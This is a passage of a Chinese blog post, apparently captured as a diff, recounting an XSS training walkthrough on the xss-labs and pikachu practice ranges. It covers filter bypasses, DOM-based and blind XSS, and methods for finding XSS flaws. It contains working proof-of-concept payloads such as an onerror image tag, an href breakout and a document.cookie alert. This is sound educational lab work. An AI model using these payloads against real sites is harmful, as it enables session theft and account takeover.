+<p><strong>url编码后的换行符（%0A）代替空格</strong></p>
+<p>新知识：使用url编码后的换行符去代替空格，在浏览器解析时他会自动将换行符换成空格（进行的一个自修正的动作）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=&quot;x&quot;%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>我们发现这个a和b的值是可以自己修改的</p>
+<p>那我们就先来测试一波到底过滤了些什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/23/XSS/f1af8e686eebc4a859be9fc3ea845206.png" alt="img"></p>
+<p>大写转换成了小写</p>
+<p>我们传入的参数全部出现在embed标签上，下面来介绍一下，embed标签</p>
+<h4 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h4><p><img src="/2025/08/23/XSS/353ddc989a5368c0a833d3240821e6b8.png" alt="img"></p>
+<p>本题后端使用的文件是一个swf文件，必须用能用flash插件的浏览器才能打开本题，但是没有必要，因为现在很多浏览器都不会去使用这个插件了，我们直接改后端也一样的，重要的是为embed标签划分一个区域</p>
+<p>将后端第十七关的代码（level17.php）指向的swf文件改为index.png</p>
+<p>重新打开网站后就是这样，意味着我们已经成功为embed标签定义了一个区域</p>
+<p><img src="/2025/08/23/XSS/7815ddf02e83f877ff8cf86e1c912b60.png" alt="img"></p>
+<p><img src="/2025/08/23/XSS/071ff762a12b580a141307e16ecacc95.png" alt="img"></p>
+<p>看了下一关，就是换了一个swf文件，也没过滤啥，就一个html实体转义，和这关差不多直接19关</p>
+<p>本来想继续攻打19关，但是19和20讲的是flash xss flash这个插件现在很多浏览器都用不上了</p>
+<p>那这个漏洞更是在实战中基本用不上</p>
+<p>那么这个靶场就到这咯</p>
+<p>杀青！</p>
+<p>学完这个靶场基本xss的绕过就差不多了</p>
+<p>下面继续学习xss漏洞的挖掘</p>
+<h2 id="xss漏洞挖掘"><a href="#xss漏洞挖掘" class="headerlink" title="xss漏洞挖掘"></a>xss漏洞挖掘</h2><p><strong>黑盒测试</strong></p>
+<p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
+<ul>
+<li>URL的每一个参数</li>
+<li>URL本身</li>
+<li>表单</li>
+<li>搜索框</li>
+</ul>
+<p><strong>常见业务场景</strong></p>
+<ul>
+<li>重灾区：评论区、留言区、个人信息、订单信息等</li>
+<li>针对型：站内信、网页即时通讯、私信、意见反馈</li>
+<li>存在风险：搜索框、当前目录、图片属性等</li>
+</ul>
+<p><strong>白盒测试(代码审计)</strong></p>
+<p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
+<p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=176561629&content_type=Article&match_order=1&q=html%E7%BC%96%E7%A0%81&zhida_source=entity">html编码</a>等处理。</p>
+<p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
+<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
+<h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>小白如我，肯定还是从大佬的文章中习得的知识</p>
+<p>上面提到过</p>
+<p>后面加练几道pikachu靶场里的题</p>
+<h2 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>打开题目看到一个搜索框，随便输入一个scirpt标签之后，输入框底下出现一行英文，大概率是一个超链接</p>
+<p>我们右键查看页面源代码，找到这行英文所在地</p>
+<p>果不其然是有一段js代码</p>
+<p><img src="/2025/08/23/XSS/2fc07c141a5a45b4806039cd17ffd99d.png" alt="img"></p>
+<p>在这个js代码中我们看到了容易触发dom型xss漏洞的属性比如说document，innerhtml</p>
+<p>但也确实是能通过我们自己构造恶意payload，然后因为这段js代码里面含有innerhtml，它会将我们输入的东西插到原来的js片段中，然后浏览器会再次渲染这段js片段，在我们人为干预下触发xss漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;#&#x27; onclick=&quot;alert(777)&quot;&gt;&#x27;&gt;what do you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(777)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看似正常的一个a标签超链接，却已经因为我们插入的paylaod不能再正常使用</p>
+<p>paylaod中的第一个单引号会闭合href属性，最后的&gt;会闭合a标签，使&gt;what do you see?</a>成为独立的一部分</p>
+<p>插入后点击即可触发xss漏洞出现弹窗777</p>
+<p><img src="/2025/08/23/XSS/292880878a058e2b989f6997894268b1.png" alt="img"></p>
+<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>和上一关一样先随便输入一个字符串看看页面源码</p>
+<p><img src="/2025/08/23/XSS/8d8a73f394ac4d373ede107fe82008dd.png" alt="img"></p>
+<p>然后我们开始正式注入恶意代码，paylaod和上一关一样</p>
+<p><img src="/2025/08/23/XSS/fac04a639e766c4a22fc3a216a206643.png" alt="img"></p>
+<h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><p>我们正常想以往那样直接输入字符串，然后查看页面源码，寻找目的字段附近是否有提示啥的</p>
+<p>发现</p>
+<p><img src="/2025/08/23/XSS/1b5b23119c557400efea5a7217d66db1.png" alt="img"></p>
+<p>那这就又出现了xss的一种新风格</p>
+<p>xss之盲打</p>
+<p>盲打听着就很令人头大，那这究竟是啥</p>
+<p>其实呢，<strong>盲打XSS是一种特殊类型的跨站脚本攻击，攻击者注入的恶意代码不会立即执行，而是被存储在后端系统中，当特定用户（如管理员）查看相关数据时才会触发。</strong><br>攻击者无法立即看到攻击结果，需要等待甚至可能永远不知道攻击是否成功（真的很搞人心态呢），因此称为”盲打”。</p>
+<p>那我们就先正常注入一段恶意代码再通过靶场的提示去登入后台</p>
+<p>我尝试了好几次，都成功登入后台了，而且看到了我的输入记录，并不知道是否有盲打到呢</p>
+<p>参考了大佬的文章用了新的paylaod（基于盲打一般是为了盗取管理员和特权用户的会话cookie和盗取后台信息啥的）</p>
+<p>直接用一个登入后台是否能拿到cookie的paylaod</p>
+<p><img src="/2025/08/23/XSS/18067980a954103eacf4f40e1cc62c2c.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>document.cookie 是 JavaScript 中用于访问和操作当前文档的 Cookie 的属性。</p>
+<p>到这很明显的看到成了</p>
+<p>最后总结其实盲打xss是一种赌徒行为啊，因为没有立刻的看到攻击结果，你并不知道他是否有这个漏洞，或者它后台有什么过滤，你都不知道，但是真要是赌成了，那真是牛很厉害了</p>
+<p>ok到这pikachu靶场没有和上面那个靶场重合的地方都过完了</p>
+<p>到这xss这个漏洞就杀青啦！</p>
+<p>完结撒花！！！！！！！！</p>
+
     </article>
     
     <div class="read-nums">
@@ -394,7 +770,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">原理和分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.1.5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">1.1.6.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E5%92%8CDOM%E5%9E%8Bxss"><span class="toc-number">1.1.7.</span> <span class="toc-text">反射型xss和DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.8.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs"><span class="toc-number">1.2.</span> <span class="toc-text">xss-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-number">1.2.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-number">1.2.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-number">1.2.3.</span> <span class="toc-text">level3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#onfocus%E4%BA%8B%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">onfocus事件绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javascript%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">javascript伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E4%BA%8B%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">内联事件属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">xss触发标签</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-number">1.2.4.</span> <span class="toc-text">level5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-href%E6%A0%87%E7%AD%BE%E6%B3%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">a href标签法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level6"><span class="toc-number">1.2.5.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-3"><span class="toc-number">1.2.6.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-number">1.2.7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8"><span class="toc-number">1.2.8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9"><span class="toc-number">1.2.9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10"><span class="toc-number">1.2.10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level11"><span class="toc-number">1.2.11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level12"><span class="toc-number">1.2.12.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level13"><span class="toc-number">1.2.13.</span> <span class="toc-text">level13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level15"><span class="toc-number">1.2.14.</span> <span class="toc-text">level15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ng-include%EF%BC%9A"><span class="toc-number">1.2.14.1.</span> <span class="toc-text">ng-include：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level16"><span class="toc-number">1.2.15.</span> <span class="toc-text">level16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level17"><span class="toc-number">1.2.16.</span> <span class="toc-text">level17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#embed%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.16.1.</span> <span class="toc-text">embed标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.</span> <span class="toc-text">xss漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#-4"><span class="toc-number">1.3.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.4.</span> <span class="toc-text">pikachu靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#-5"><span class="toc-number">1.4.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">1.4.2.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">1.4.3.</span> <span class="toc-text">DOM型xss-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">1.4.4.</span> <span class="toc-text">xss之盲打</span></a></li></ol></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
